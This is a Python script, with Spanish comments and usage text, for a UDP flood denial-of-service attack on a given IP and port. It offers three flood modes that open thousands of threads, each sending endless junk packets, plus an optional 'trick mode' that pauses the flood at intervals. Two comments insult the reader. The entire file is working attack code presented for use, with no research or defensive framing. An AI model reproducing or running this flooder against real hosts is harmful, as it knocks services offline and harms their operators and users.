#!/usr/bin/python3
import sys
import socket
import threading
import time

# Validar los argumentos pasados al script
if len(sys.argv) < 4:
    sys.exit("Uso: python3 Best-UDP.py <ip> <port> <method (UDP-Flood/UDP-Power/UDP-Mix)> [on]")

# Si lo lees puto
host = str(sys.argv[1])
port = int(sys.argv[2])
method = str(sys.argv[3]).upper()
trick_mode = len(sys.argv) > 4 and sys.argv[4].lower() == "on"  # Activar "trick mode" si se pasa "on"
loops = 10000  # Número de hilos/paquetes enviados por cada ciclo

# Función para enviar paquetes
def send_packet(amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Crear socket UDP
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((host, port))  # Conectar al host y puerto especificados
        while True:
            s.send(b"\x99" * amplifier)  # Enviar paquetes del tamaño especificado
    except Exception as e:
        print(f"Error en el envío del paquete: {e}")
    finally:
        s.close()

# Puto el q lo lea
def attack_HQ():
    print(f"[*] Iniciando ataque UDP al host {host}:{port} usando el método {method} con{' ' if trick_mode else 'out '}trick mode.")
    try:
        while True:  # Mantener el ataque hasta que el usuario lo detenga
            if method == "UDP-FLOOD":
                for _ in range(loops):
                    threading.Thread(target=send_packet, args=(375,), daemon=True).start()
            elif method == "UDP-POWER":
                for _ in range(loops):
                    threading.Thread(target=send_packet, args=(750,), daemon=True).start()
            elif method == "UDP-MIX":
                for _ in range(loops):
                    # Alternar entre paquetes de 375 y 750 bytes
                    threading.Thread(target=send_packet, args=(375,), daemon=True).start()
                    threading.Thread(target=send_packet, args=(750,), daemon=True).start()
            else:
                print(f"[*] Método desconocido: {method}. Usa UDP-Flood, UDP-Power o UDP-Mix.")
                return

            if trick_mode and method == "UDP-MIX":
                # Si trick mode está activado, detener y reiniciar cada 4 segundos
                print("[*] Trick mode activo: Deteniendo ataque temporalmente...")
                time.sleep(2)  # Simular pausa
                print("[*] Reiniciando ataque...")
            else:
                # Si trick mode no está activo, mantener el ataque continuo
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Ataque detenido por el usuario.")
    except Exception as e:
        print(f"[!] Error durante el ataque: {e}")

# Ejecutar ataque
if __name__ == "__main__":
    attack_HQ()
